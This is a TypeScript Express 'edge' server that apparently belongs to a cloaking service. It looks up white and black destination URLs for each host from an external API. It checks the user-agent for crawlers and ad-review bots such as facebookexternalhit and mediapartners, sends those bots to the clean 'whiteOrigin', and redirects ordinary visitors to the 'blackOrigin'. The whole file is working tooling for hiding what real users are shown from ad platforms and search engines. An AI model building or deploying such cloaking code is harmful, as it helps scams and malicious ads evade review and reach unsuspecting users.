import express from "express";
import axios from "axios";
import * as dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT || 8080);
const API_URL = process.env.API_URL || "https://api.cloakerguard.com.br";

function log(...args: any[]) {
  process.stdout.write(args.map(String).join(" ") + "\n");
}
function error(...args: any[]) {
  process.stderr.write(args.map(String).join(" ") + "\n");
}

function normalizeHost(raw = "") {
  return raw.split(",")[0].trim().toLowerCase().replace(/:\d+$/, "");
}

function normalizeTarget(url: string | undefined | null): string | null {
  if (!url) return null;
  let clean = url.trim();
  clean = clean.replace(/^\/+/, "");
  if (!/^https?:\/\//i.test(clean)) {
    clean = `https://${clean}`;
  }
  return clean;
}

app.use(async (req: any, res) => {
  try {
    log("=== Nova requisição recebida ===");
    log("[HEADERS]", JSON.stringify(req.headers, null, 2));

    const host = normalizeHost(
      req.headers["x-forwarded-host"] || req.headers.host || ""
    );
    if (!host) return res.status(400).send("Host header required");

    log("[EDGE] Host normalizado:", host);

    const ua = req.headers["user-agent"]?.toLowerCase() || "";
    log("[EDGE] UA:", ua || "(sem UA)");

    const resp = await axios.get(`${API_URL}/domains/resolve`, {
      params: { host },
      timeout: 5000,
    });

    const data = resp.data;
    log("[EDGE] Dados recebidos da API:", JSON.stringify(data));

    const isBot =
      /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
        ua
      );
    log("[EDGE] ISBOT:", isBot);

    let target: string | null = null;
    if (isBot) {
      target = normalizeTarget(data.whiteOrigin);
      log("[EDGE] Bot detectado → whiteOrigin:", target);
    } else {
      target = normalizeTarget(data.blackOrigin);
      log("[EDGE] Usuário normal → blackOrigin:", target);
    }

    if (!target) {
      target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
      log("[EDGE] Fallback acionado:", target);
    }

    if (!target) {
      error("[EDGE] Nenhum destino configurado para host:", host);
      return res.status(500).send("Nenhum destino configurado");
    }

    log(`[EDGE] Redirecionando ${host} -> ${target}`);
    res.setHeader("Cache-Control", "no-store");
    return res.redirect(302, target);
  } catch (err: any) {
    error("[EDGE] Erro:", err.message);
    return res.status(500).send("Internal proxy error");
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🌍 Edge rodando na porta ${PORT}`);
});
